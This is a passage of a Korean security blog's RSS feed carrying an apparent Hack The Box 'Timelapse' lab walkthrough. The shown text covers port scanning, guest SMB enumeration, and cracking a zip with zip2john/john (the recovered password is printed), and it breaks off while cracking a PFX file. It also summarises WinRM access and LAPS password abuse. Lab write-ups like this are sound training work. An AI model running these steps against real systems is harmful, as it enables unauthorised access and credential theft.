<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[RSS Feed of 𝓃u⚡︎3114 β10g]]></title><description><![CDATA[사이버 시큐리티 관련 지식과 정보 그리고 일상을 공유하는 공간입니다]]></description><link>https://h3llanut3lla.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Mon, 10 Feb 2025 05:01:30 GMT</lastBuildDate><item><title><![CDATA[Timelapse]]></title><description><![CDATA[Timelapse 요약  🌟한 줄 평
  이나  등의 색다른(?)파일의 해시 크래킹을 배울 수 있어서 좋았고, LAPS 비밀번호 읽는 법을 배울 수 있었다. Timelapse는 쉬운 난이도의 윈도우즈 시스템으로, 공개적으로 액세스 가능한 SMB…]]></description><link>https://h3llanut3lla.github.io/Timelapse/</link><guid isPermaLink="false">https://h3llanut3lla.github.io/Timelapse/</guid><pubDate>Mon, 10 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2 id=&quot;Timelapse-요약&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#Timelapse-%EC%9A%94%EC%95%BD&quot; aria-label=&quot;Timelapse 요약 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;Timelapse 요약&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/594c0449-cf6f-47cf-9a96-362af9c47fd6/image.png&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;🌟&lt;strong&gt;한 줄 평&lt;/strong&gt;
&lt;code class=&quot;language-text&quot;&gt;.zip&lt;/code&gt; 이나 &lt;code class=&quot;language-text&quot;&gt;.pfx&lt;/code&gt; 등의 색다른(?)파일의 해시 크래킹을 배울 수 있어서 좋았고, LAPS 비밀번호 읽는 법을 배울 수 있었다.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Timelapse는 쉬운 난이도의 윈도우즈 시스템으로, 공개적으로 액세스 가능한 SMB쉐어에 zip파일을 가지고 있다. zip파일을 추출하면 암호화된 PFX파일을 얻을 수 있으며 이것을 John이 읽을 수 있는 해시 형식으로 변환하면 SSL 인증서와 개인 키를 얻을 수 있다. &lt;/p&gt;
&lt;p&gt;WinRM을 통해 시스템 초입을 하면 사용자 로그인 자격 증명이 포함된 파워쉘 히스토리 파일을 볼 수 있다. 권한상승을 위한 정보수집 진행 시, 사용자가 &lt;code class=&quot;language-text&quot;&gt;LAPS_Readers&lt;/code&gt; 그룹의 일원임을 알 수 있고. 이 그룹은 LAPS를 이용하여 도메인내 컴퓨터의 로컬 비밀번호를 읽을 수 있다. 이 신뢰를 남용하여 관리자로 권한상승이 가능하다.  &lt;/p&gt;
&lt;h2 id=&quot;정보-수집&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A0%95%EB%B3%B4-%EC%88%98%EC%A7%91&quot; aria-label=&quot;정보 수집 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;정보 수집&lt;/h2&gt;
&lt;h3 id=&quot;Nmap-포트-스캔&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#Nmap-%ED%8F%AC%ED%8A%B8-%EC%8A%A4%EC%BA%94&quot; aria-label=&quot;Nmap 포트 스캔 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;Nmap 포트 스캔&lt;/h3&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;PORT      STATE SERVICE       REASON  VERSION
&lt;span class=&quot;token number&quot;&gt;53&lt;/span&gt;/tcp    &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  domain?       syn-ack
&lt;span class=&quot;token number&quot;&gt;88&lt;/span&gt;/tcp    &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  kerberos-sec  syn-ack Microsoft Windows Kerberos &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;server time: &lt;span class=&quot;token number&quot;&gt;2024&lt;/span&gt;-08-11 09:51:03Z&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;135&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  msrpc         syn-ack Microsoft Windows RPC
&lt;span class=&quot;token number&quot;&gt;139&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
&lt;span class=&quot;token number&quot;&gt;389&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  ldap          syn-ack Microsoft Windows Active Directory LDAP &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Domain: timelapse.htb0., Site: Default-First-Site-Name&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;445&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  microsoft-ds? syn-ack
&lt;span class=&quot;token number&quot;&gt;464&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  kpasswd5?     syn-ack
&lt;span class=&quot;token number&quot;&gt;593&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  ncacn_http    syn-ack Microsoft Windows RPC over HTTP &lt;span class=&quot;token number&quot;&gt;1.0&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;636&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  tcpwrapped    syn-ack
&lt;span class=&quot;token number&quot;&gt;3268&lt;/span&gt;/tcp  &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  ldap          syn-ack Microsoft Windows Active Directory LDAP &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Domain: timelapse.htb0., Site: Default-First-Site-Name&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;3269&lt;/span&gt;/tcp  &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  tcpwrapped    syn-ack
&lt;span class=&quot;token number&quot;&gt;5986&lt;/span&gt;/tcp  &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  ssl/http      syn-ack Microsoft HTTPAPI httpd &lt;span class=&quot;token number&quot;&gt;2.0&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;139,445 SMB 포트가 열린 것을 확인할 수 있다. &lt;/li&gt;
&lt;li&gt;5986 ssl/http가 열린 것을 확인할 수 있다. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;구글링을 해보면 &lt;a href=&quot;https://learn.microsoft.com/en-us/troubleshoot/windows-client/system-management-components/configure-winrm-for-https&quot;&gt;마이크로소프트의 페이지&lt;/a&gt;에서 아래와 같은 내용을 볼 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/b549bca7-b6b0-40b5-851c-a3cc0677f706/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;SSL을 사용하는 WinRM 이라고. &lt;/p&gt;
&lt;h3 id=&quot;SMB&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#SMB&quot; aria-label=&quot;SMB permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;SMB&lt;/h3&gt;
&lt;h4 id=&quot;winrm_backupzip&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#winrm_backupzip&quot; aria-label=&quot;winrm_backupzip permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;winrm_backup.zip&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/89c4e6c8-6635-4d3c-84df-ab95c8f5ca74/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;nxc로 null 세션을 시도해 보았지만 성과가 없었고, 게스트 로그인을 시도했을때는 &lt;code class=&quot;language-text&quot;&gt;Shares&lt;/code&gt; 라는 쉐어를 읽을 권한이 있음을 확인 할 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;-M spider_plus&lt;/code&gt; 플래그를 이용해 게스트 사용자로써 읽을 수 있는 파일을 json 파일로 받아 보았다. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;nxc smb &lt;span class=&quot;token parameter variable&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;guest&apos;&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-M&lt;/span&gt; spider_plus&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;Shares&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;Dev/winrm_backup.zip&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;atime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2022-03-04 19:00:38&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;ctime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:14&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;mtime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 08:05:30&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2.55 KB&quot;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;HelpDesk/LAPS.x64.msi&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;atime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:42&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;ctime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:42&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;mtime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:55:14&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;1.07 MB&quot;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;HelpDesk/LAPS_Datasheet.docx&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;atime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:42&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;ctime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:42&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;mtime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:55:14&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;101.97 KB&quot;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;HelpDesk/LAPS_OperationsGuide.docx&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;atime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:42&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;ctime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:42&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;mtime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:55:14&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;626.35 KB&quot;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;HelpDesk/LAPS_TechnicalSpecification.docx&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;atime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:42&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;ctime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:48:42&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;mtime_epoch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;2021-10-26 02:55:14&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token property&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;70.98 KB&quot;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Shares/Dev/winrm-backup.zip&lt;/code&gt; 파일을 &lt;code class=&quot;language-text&quot;&gt;smbclient&lt;/code&gt; 를 이용해 다운받는다. 압축해제를 하려고 보니 아래와 같이 비밀번호가 필요한 것을 확인 할 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/531a45a7-7fcf-44c7-8b90-da7bc6bcbd03/image.png&quot;&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# zip파일을 john이 읽을 수 있도록 해쉬 변환&lt;/span&gt;
zip2john winrm_backup.zip &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;hash&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# john을 이용해 해쉬 크랙&lt;/span&gt;
john &lt;span class=&quot;token parameter variable&quot;&gt;-w&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;token builtin class-name&quot;&gt;hash&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위 명령어를 입력하면 아래와 같이 일반 텍스트의 비밀번호를 얻을 수 있다. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;zip파일 비밀번호: &lt;code class=&quot;language-text&quot;&gt;supremelegacy&lt;/code&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/1c1e6529-a623-485d-be18-ca2bcce6d939/image.png&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;legacyydevauthpfx&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#legacyydevauthpfx&quot; aria-label=&quot;legacyydevauthpfx permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;legacyy&lt;em&gt;dev&lt;/em&gt;auth.pfx&lt;/h4&gt;
&lt;p&gt;압축 해제된 파일에는 &lt;code class=&quot;language-text&quot;&gt;legacyy_dev_auth.pfx&lt;/code&gt; 라는 파일이 있다. PFX파일은 SSL 인증서과 개인 키를 포함하고 WinRM에서 PFX 파일을 사용 할 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file&quot;&gt;이 글&lt;/a&gt;을 보면 pfx에서 SSL 인증서와 개인 키를 추출하는 법을 알 수 있다. &lt;/p&gt;
&lt;p&gt;문제는 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/355cbe65-0b63-4097-b500-827e980c28c0/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;이 파일 또한 비밀번호가 필요하다는 것이다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/d7c489e3-dd00-4cc9-8809-806273a3e871/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;비밀번호 재사용 (Password re-use)시도를 해 보았지만 안되었다. Zip파일 비밀번호를 크랙했던 것 처럼, john을 재사용 해보자. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# 해시 변경&lt;/span&gt;
python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; pfx.john

&lt;span class=&quot;token comment&quot;&gt;# 해시 크랙&lt;/span&gt;
